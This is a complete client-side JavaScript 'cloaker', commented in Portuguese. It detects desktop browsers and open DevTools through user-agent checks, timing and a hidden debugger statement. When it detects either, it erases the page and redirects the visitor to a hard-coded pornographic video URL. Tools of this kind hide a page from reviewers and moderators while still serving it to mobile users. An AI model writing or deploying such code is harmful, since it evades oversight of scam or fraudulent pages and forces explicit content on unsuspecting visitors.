/**
 * CLOAKER CLIENT-SIDE - VERSÃO 2.2
 * Proteção contra desktop e DevTools
 * Autor: Sistema de Proteção Avançada
 * Data: 2025
 */

(function() {
    'use strict';
    
    // Configuração do redirecionamento
    const REDIRECT_URL = 'https://www.xvideos.com/video.umtvkhb9ecc/meio-irmao_gostosa_e_fodida_pelo_meio-irmao';
    
    // Variáveis de controle
    let protectionActive = true;
    let lastDebugTime = Date.now();
    
    /**
     * Função principal de proteção
     */
    function initProtection() {
        if (!protectionActive) return;
        
        // Executar verificações imediatas
        checkDesktop();
        checkDevTools();
        
        // Verificação contínua apenas para DevTools
        setInterval(() => {
            if (!protectionActive) return;
            checkDevTools();
        }, 1000);
    }
    
    /**
     * 🔒 Bloquear apenas desktop real (Windows, Mac, Linux)
     */
    function checkDesktop() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        // Padrões MUITO específicos de desktop real
        const desktopPatterns = [
            'windows nt 10', 'windows nt 11', 'macintosh', 'linux x86_64'
        ];
        
        // Padrões móveis - se tiver qualquer um desses, é mobile
        const mobilePatterns = [
            'android', 'iphone', 'ipad', 'ipod', 'mobile', 'tablet'
        ];
        
        // Só é desktop se tiver padrão desktop E não tiver padrão mobile
        const hasDesktopPattern = desktopPatterns.some(pattern => userAgent.includes(pattern));
        const hasMobilePattern = mobilePatterns.some(pattern => userAgent.includes(pattern));
        
        if (hasDesktopPattern && !hasMobilePattern) {
            console.log('[PROTECTION] Desktop real detectado - redirecionando...');
            redirectToTarget();
        }
    }
    
    /**
     * 🛡️ Detectar abertura do DevTools
     */
    function checkDevTools() {
        const currentTime = Date.now();
        const timeDiff = currentTime - lastDebugTime;
        
        // Se o tempo entre execuções for maior que 100ms, DevTools foi aberto
        if (timeDiff > 100) {
            console.log('[PROTECTION] DevTools detectado - redirecionando...');
            redirectToTarget();
        }
        
        lastDebugTime = currentTime;
        
        // Debugger oculto
        try {
            debugger;
        } catch (e) {
            // Ignorar erros do debugger
        }
    }
    
    /**
     * Função de redirecionamento
     */
    function redirectToTarget() {
        protectionActive = false;
        
        // Limpar conteúdo da página
        document.documentElement.innerHTML = '';
        
        // Redirecionar
        try {
            window.location.href = REDIRECT_URL;
        } catch (e) {
            // Fallback
            window.location.replace(REDIRECT_URL);
        }
    }
    
    // Inicializar proteção quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initProtection);
    } else {
        initProtection();
    }
    
})();
